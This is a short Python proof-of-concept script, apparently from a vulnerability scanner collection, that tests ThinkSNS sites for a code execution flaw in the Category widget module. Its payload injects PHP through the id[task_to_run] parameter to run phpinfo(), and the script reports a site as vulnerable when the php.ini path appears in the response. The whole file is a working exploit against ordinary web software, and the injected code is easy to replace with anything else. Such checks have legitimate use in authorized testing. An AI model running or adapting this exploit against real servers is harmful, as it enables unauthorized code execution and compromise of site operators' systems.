#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: thinksns category模块代码执行
referer: Arice
author: Lucifer,Arice
description: 过滤不严导致的代码执行
'''
import sys
import requests
import warnings
from termcolor import cprint

class thinksns_category_code_exec_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/index.php?app=widget&mod=Category&act=getChild&model_name=Schedule&method=runSchedule&id%5Btask_to_run%5D=addons/Area)->getAreaList();phpinfo();%23"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"Configuration File (php.ini) Path" in req.text:
                cprint("[+]存在thinksns category模块代码执行漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = thinksns_category_code_exec_BaseVerify(sys.argv[1])
    testVuln.run()